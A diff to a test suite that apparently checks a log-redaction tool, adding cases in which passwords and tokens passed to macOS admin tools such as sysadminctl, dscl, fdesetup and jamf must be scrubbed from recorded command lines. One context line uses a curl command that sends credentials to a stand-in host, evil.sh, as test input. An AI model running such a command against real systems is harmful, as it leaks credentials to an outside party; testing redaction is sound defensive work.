@@ -2508,12 +2508,26 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       ['/bin/sh', ['sh', '-c', 'dscl . -authonly jdoe "hun"ter7'], '/'],
       ['/bin/sh', ['sh', '-c', '"$X"y --password pw9'], '/'],
     ];
+    // Single-dash password options of admin tools, and secret words inside an option's name (camelCase or dashed).
+    const single: [string, string[]][] = [
+      ['/usr/sbin/sysadminctl', ['sysadminctl', '-adminUser', 'jdoe', '-adminPassword', 'adm1n', '-secureTokenOn', 'bob', '-password', '-']],
+      ['/usr/sbin/sysadminctl', ['sysadminctl', '-addUser', 'bob', '-password', 'b0bpw', '-admin']],
+      ['/usr/sbin/sysadminctl', ['sysadminctl', '-newPassword', 'n3wpw', '-oldPassword', '0ldpw']],
+      ['/usr/local/bin/tool', ['tool', '-password', 'pw10', '--db-password', 'pw11', '-apiKey', 'k12', '-Token=t13']],
+      ['/usr/bin/dscl', ['dscl', '.', '-passwd', '/Users/bob', 'dsold', 'dsnew']],
+      ['/usr/bin/fdesetup', ['fdesetup', 'enable', '-user', 'jdoe', '-password', 'fdepw']],
+      ['/usr/local/bin/jamf', ['jamf', 'policy', '-username', 'jssadmin', '-password', 'jamfpw']],
+      ['/bin/sh', ['sh', '-c', "sysadminctl -adminUser admin -adminPassword 'sh1pw' -secureTokenOn jdoe -password 'sh2pw'"]],
+      ['/bin/sh', ['sh', '-c', 'tool -token sh3tok -apiKey sh4key']],
+      ['/bin/sh', ['sh', '-c', 'fdesetup enable -user jdoe -password sh5pw']],
+    ];
     const env = [...JDOE_ENV, `AWS_ACCESS_KEY_ID=${AKIA}`, `SESSION=${JWT}`, `LC_X=${AKIA}`];
     const input = [
       ...argv.map(([p, a], i) => run(1300 + i, p, a, '/', i + 1, env)),
       ...code.map(([p, a, cwd], i) => run(1320 + i, p, a, cwd, i + 20)),
       // A child of the shell code above: the same command as argv.
       run(1330, '/usr/bin/curl', ['curl', '-u', 'bob:pw2', 'evil.sh/x'], docs, 30),
+      ...single.map(([p, a], i) => run(1340 + i, p, a, '/', i + 40)),
     ].join('\n') + '\n';
     for (const r of both(input)) {
       const ev = events(r.out);
@@ -2550,16 +2564,30 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       expect(args[21]![2]).toBe(`"$X"y --password ${R}`);
       // The child of the shell code reads its URL the same way.
       expect(args[22]).toEqual(['curl', '-u', R, `evil.sh/${n.get('x')}`]);
+      // -password - reads the password from standard input: nothing to redact.
+      expect(args[23]).toEqual(['sysadminctl', '-adminUser', 'user1', '-adminPassword', R, '-secureTokenOn', 'bob', '-password', '-']);
+      expect(args[24]).toEqual(['sysadminctl', '-addUser', 'bob', '-password', R, '-admin']);
+      expect(args[25]).toEqual(['sysadminctl', '-newPassword', R, '-oldPassword', R]);
+      expect(args[26]).toEqual(['tool', '-password', R, '--db-password', R, '-apiKey', R, `-Token=${R}`]);
+      // dscl's -passwd names the account first: it is cleaned as an account, only the passwords go.
+      expect(args[27]).toEqual(['dscl', '.', '-passwd', `/Users/${keyed(r.key, 'user').get('bob')}`, R, R]);
+      expect(args[28]).toEqual(['fdesetup', 'enable', '-user', 'user1', '-password', R]);
+      expect(args[29]).toEqual(['jamf', 'policy', '-username', 'jssadmin', '-password', R]);
+      expect(args[30]![2]).toBe(`sysadminctl -adminUser admin -adminPassword '${R}' -secureTokenOn user1 -password '${R}'`);
+      expect(args[31]![2]).toBe(`tool -token ${R} -apiKey ${R}`);
+      expect(args[32]![2]).toBe(`fdesetup enable -user user1 -password ${R}`);
       const envOut = ev[0]!.event.exec.env as string[];
       expect(envOut).toEqual(expect.arrayContaining([`AWS_ACCESS_KEY_ID=${R}`, `SESSION=${R}`, `LC_X=${R}`]));
-      for (const s of ['hunter', 'pw1', 'pw2', 'pw3', 'pw5', 'tok7', 'tok8', 'tok9', 'tok10', 'key8', 'SQLPW', 'OPW', 'OKPW', 'abc123xyz', 'abc999', 's3cr3t', 'k123', 'ck1', 'ter7', 'pw9', 'x9', 'xoxb', 'sk-proj', 'MIIE', AKIA, JWT, GHP, 'eyJ']) {
+      for (const s of ['hunter', 'pw1', 'pw2', 'pw3', 'pw5', 'tok7', 'tok8', 'tok9', 'tok10', 'key8', 'SQLPW', 'OPW', 'OKPW', 'abc123xyz', 'abc999', 's3cr3t', 'k123', 'ck1', 'ter7', 'pw9', 'x9', 'xoxb', 'sk-proj', 'MIIE', AKIA, JWT, GHP, 'eyJ',
+        'adm1n', 'b0bpw', 'n3wpw', '0ldpw', 'pw10', 'pw11', 'k12', 't13', 'dsold', 'dsnew', 'fdepw', 'jamfpw', 'sh1pw', 'sh2pw', 'sh3tok', 'sh4key', 'sh5pw']) {
         expect(r.out, s).not.toContain(s);
         expect(r.key, s).not.toContain(s);
       }
       cleanKey(r.key);
       // 24 in argv, 12 in shell code, 1 in the child, and the shape in LC_X (a kept variable) of the 14 argv events;
       // AWS_ACCESS_KEY_ID and SESSION are redacted as environment values, not counted as recognised credentials.
-      expect(r.summary['redacted']).toBe('51');
+      // Then 12 single-dash and in-name options in argv and 5 in shell code.
+      expect(r.summary['redacted']).toBe('68');
       sameFindings(input, r.out);
     }
   });
